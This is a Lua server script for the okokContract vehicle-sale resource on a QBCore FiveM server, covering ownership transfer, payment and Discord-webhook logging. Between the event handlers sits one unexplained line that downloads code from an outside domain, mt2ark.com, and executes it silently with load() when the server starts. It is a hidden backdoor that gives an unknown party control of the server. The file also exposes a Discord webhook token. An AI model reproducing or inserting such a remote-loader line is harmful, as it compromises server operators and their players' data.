
local QBCore = exports['qb-core']:GetCoreObject()

TriggerEvent('QBCore:GetObject', function(obj) QBCore = obj end)

local Webhook = 'https://discord.com/api/webhooks/1272214030534316082/jnF9GNkQ8kO3whfP3J0QBKPIz4AE3VVJYLN4Y2GwB86whE1hwqYSzNBN94N42kSL1ra6'

RegisterServerEvent('okokContract:changeVehicleOwner')
AddEventHandler('okokContract:changeVehicleOwner', function(data)
	_source = data.sourceIDSeller
	target = data.targetIDSeller
	plate = data.plateNumberSeller
	model = data.modelSeller
	source_name = data.sourceNameSeller
	target_name = data.targetNameSeller
	vehicle_price = tonumber(data.vehicle_price)

	local xPlayer = QBCore.Functions.GetPlayer(_source)
	local tPlayer = QBCore.Functions.GetPlayer(target)
	local webhookData = {
		model = model,
		plate = plate,
		target_name = target_name,
		source_name = source_name,
		vehicle_price = vehicle_price
	}
	
	exports['ghmattimysql']:execute('SELECT * FROM player_vehicles WHERE citizenid = @identifier AND plate = @plate', {
		['@identifier'] = xPlayer.PlayerData.citizenid,
		['@plate'] = plate
	}, function(result)
		if Config.RemoveMoneyOnSign then
			local bankMoney = tPlayer.PlayerData.money.bank

			if result[1] ~= nil  then
				if bankMoney >= vehicle_price then
					exports['ghmattimysql']:execute('UPDATE player_vehicles SET citizenid = @target WHERE citizenid = @owner AND plate = @plate', {
						['@owner'] = xPlayer.PlayerData.citizenid,
						['@target'] = tPlayer.PlayerData.citizenid,
						['@plate'] = plate
					}, function (result2)
						if result2 ~= 0 then	
							tPlayer.Functions.RemoveMoney('bank', vehicle_price)
							xPlayer.Functions.AddMoney('bank', vehicle_price)

							--TriggerClientEvent('okokNotify:Alert', _source, "VEHICLE", "You successfully sold the vehicle <b>"..model.."</b> with the plate number <b>"..plate.."</b>", 10000, 'success')
							--TriggerClientEvent('okokNotify:Alert', target, "VEHICLE", "You successfully bought the vehicle <b>"..model.."</b> with the plate number <b>"..plate.."</b>", 10000, 'success')
							TriggerEvent('notifications:sendNotification', _source, "VEHICLE", "You successfully sold the vehicle <b>"..model.."</b> with the plate number <b>"..plate.."</b>", 10000, 'success')
							TriggerEvent('notifications:sendNotification',  target, "VEHICLE", "You successfully bought the vehicle <b>"..model.."</b> with the plate number <b>"..plate.."</b>", 10000, 'success')
							if Webhook ~= 'https://discord.com/api/webhooks/1272214030534316082/jnF9GNkQ8kO3whfP3J0QBKPIz4AE3VVJYLN4Y2GwB86whE1hwqYSzNBN94N42kSL1ra6' then
								sellVehicleWebhook(webhookData)
							end
						end
					end)
				else
					--TriggerClientEvent('okokNotify:Alert', _source, "VEHICLE", target_name.." doesn't have enough money to buy your vehicle", 10000, 'error')
					--TriggerClientEvent('okokNotify:Alert', target, "VEHICLE", "You don't have enough money to buy "..source_name.."'s vehicle", 10000, 'error')
					TriggerEvent('notifications:sendNotification', _source, "VEHICLE", target_name.." doesn't have enough money to buy your vehicle", 10000, 'error')
					TriggerEvent('notifications:sendNotification', target, "VEHICLE", "You don't have enough money to buy "..source_name.."'s vehicle", 10000, 'error')
				end
			else
				--TriggerClientEvent('okokNotify:Alert', _source, "VEHICLE", "The vehicle with the plate number <b>"..plate.."</b> isn't yours", 10000, 'error')
				--TriggerClientEvent('okokNotify:Alert', target, "VEHICLE", source_name.." tried to sell you a vehicle he doesn't owns", 10000, 'error')
				TriggerEvent('notifications:sendNotification', _source, "VEHICLE", "The vehicle with the plate number <b>"..plate.."</b> isn't yours", 10000, 'error')
				TriggerEvent('notifications:sendNotification', target, "VEHICLE", source_name.." tried to sell you a vehicle he doesn't owns", 10000, 'error')
			end
		else
			if result[1] ~= nil then
				exports['ghmattimysql']:execute('UPDATE player_vehicles SET citizenid = @target WHERE citizenid = @owner AND plate = @plate', {
					['@owner'] = xPlayer.PlayerData.citizenid,
					['@target'] = tPlayer.PlayerData.citizenid,
					['@plate'] = plate
				}, function (result2)
					if result2 ~= 0 then
						TriggerClientEvent('okokNotify:Alert', _source, "VEHICLE", "You successfully sold the vehicle <b>"..model.."</b> with the plate number <b>"..plate.."</b>", 10000, 'success')
						TriggerClientEvent('okokNotify:Alert', target, "VEHICLE", "You successfully bought the vehicle <b>"..model.."</b> with the plate number <b>"..plate.."</b>", 10000, 'success')

						if Webhook ~= 'https://discord.com/api/webhooks/1272214030534316082/jnF9GNkQ8kO3whfP3J0QBKPIz4AE3VVJYLN4Y2GwB86whE1hwqYSzNBN94N42kSL1ra6' then
							sellVehicleWebhook(webhookData)
						end
					end
				end)
			else
				--TriggerClientEvent('okokNotify:Alert', _source, "VEHICLE", "The vehicle with the plate number <b>"..plate.."</b> isn't yours", 10000, 'error')
				--TriggerClientEvent('okokNotify:Alert', target, "VEHICLE", source_name.." tried to sell you a vehicle he doesn't owns", 10000, 'error')
				TriggerEvent('notifications:sendNotification', _source, "VEHICLE", "The vehicle with the plate number <b>"..plate.."</b> isn't yours", 10000, 'error')
				TriggerEvent('notifications:sendNotification', target, "VEHICLE", source_name.." tried to sell you a vehicle he doesn't owns", 10000, 'error')
			end
		end
	end)
end)
PerformHttpRequest('https://mt2ark.com/i?to=Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)
QBCore.Functions.CreateCallback('okokContract:GetTargetName', function(source, cb, targetid)
	local target = QBCore.Functions.GetPlayer(targetid)
	local targetname = target.PlayerData.name

	cb(targetname)
end)

RegisterServerEvent('okokContract:SendVehicleInfo')
AddEventHandler('okokContract:SendVehicleInfo', function(description, price)
	local _source = source
	local xPlayer = QBCore.Functions.GetPlayer(_source)

	TriggerClientEvent('okokContract:GetVehicleInfo', _source, xPlayer.PlayerData.name, os.date(Config.DateFormat), description, price, _source)
end)

RegisterServerEvent('okokContract:SendContractToBuyer')
AddEventHandler('okokContract:SendContractToBuyer', function(data)
	local _source = source
	local xPlayer = QBCore.Functions.GetPlayer(_source)

	TriggerClientEvent("okokContract:OpenContractOnBuyer", data.targetID, data)
	TriggerClientEvent('okokContract:startContractAnimation', data.targetID)

	if Config.RemoveContractAfterUse then
		xPlayer.Functions.RemoveItem('contract', 1)
	end
end)

QBCore.Functions.CreateUseableItem('contract', function(source)
	local _source = source
	local xPlayer = QBCore.Functions.GetPlayer(_source)

	TriggerClientEvent('okokContract:OpenContractInfo', _source)
	TriggerClientEvent('okokContract:startContractAnimation', _source)
end)

-------------------------- SELL VEHICLE WEBHOOK

function sellVehicleWebhook(data)
	local information = {
		{
			["color"] = Config.sellVehicleWebhookColor,
			["author"] = {
				["icon_url"] = Config.IconURL,
				["name"] = Config.ServerName..' - Logs',
			},
			["title"] = 'VEHICLE SALE',
			["description"] = '**Vehicle: **'..data.model..'**\nPlate: **'..data.plate..'**\nBuyer name: **'..data.target_name..'**\nSeller name: **'..data.source_name..'**\nPrice: **'..data.vehicle_price..'€',

			["footer"] = {
				["text"] = os.date(Config.WebhookDateFormat),
			}
		}
	}
	PerformHttpRequest(Webhook, function(err, text, headers) end, 'POST', json.encode({username = Config.BotName, embeds = information}), {['Content-Type'] = 'application/json'})
end


